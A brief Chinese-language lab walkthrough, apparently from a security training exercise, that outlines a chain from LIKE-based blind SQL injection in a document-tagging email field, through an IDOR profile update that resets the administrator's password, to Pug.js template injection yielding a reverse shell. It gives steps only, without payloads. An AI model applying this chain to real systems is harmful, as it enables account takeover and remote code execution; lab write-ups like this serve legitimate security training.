访问本lab时，页面如下：

本实验涉及到Like Blind SQL Injection，IDOR，SSTI。

从SQLi到RCE的流程如下：

  1. 首先需要注册一个普通用户，然后登录。登录之后新建一个Document，保存之后点击该Document最下方的tag按钮，可以指定Document的归属，在这里的User's Email填写处存在Like Blind SQL Injection。
  2. 利用盲注获取管理员的token。
  3. 在普通用户处有个Edit Profile的功能，填写信息然后Update，Burpsuite拦截该数据包，将用户信息更改为管理员的信息，密码改成我们知道的密码即可。token改为第一步获取的管理员token。
  4. 上一步主要是修改管理员密码，利用修改好的管理员账户密码登录管理员。
  5. 在这里的管理员后台有一个Edit Server Settings的功能，这里可以使用PugJs SSTI反弹Shell，完成RCE操作。
